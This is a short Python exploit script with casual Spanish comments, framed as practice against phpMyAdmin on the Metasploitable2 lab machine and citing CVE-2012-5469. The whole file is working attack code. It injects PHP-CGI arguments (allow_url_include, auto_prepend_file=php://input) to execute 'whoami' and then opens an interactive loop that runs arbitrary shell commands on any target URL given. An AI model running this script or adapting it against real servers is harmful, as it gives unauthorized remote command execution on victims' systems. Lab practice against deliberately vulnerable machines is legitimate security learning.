#!/usr/bin/env python
#_*_ coding: utf8 _*_
import requests
import argparse
##### Esta es una practica para phpMyAdmin de metasploitable2, refiere al CVE-2012-5469
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()

def main():
	if parser.target:
		vuln = "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
		target = parser.target
		if not target.startswith("http://"):
			target = 'http://'+target	# si lo que pone el user no tiene http:// , entonces agregasela porfisporfis
		try:
			exp = requests.post(target+vuln,"<?php system('whoami'); die(); ?>")
			user = exp.text		# Converti la variable exp en formato ascii o utf-8 se me hace che. Vosotros que decis?
			user = user.replace("\n","")	#Si encontras saltos de linea, eliminalos reemplazandolos con la nada. que concepto eh...
			try:
				while True:
					comando = input("{}$: ".format(user))
					exp = requests.post(target+vuln,"<?php system('{}'); die(); ?>".format(comando))
					print (exp.text)
			except KeyboardInterrupt:
				exit()
		except:
			print("Fallo al conectar")

	else:
		print("Introduce el Objetivo")
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
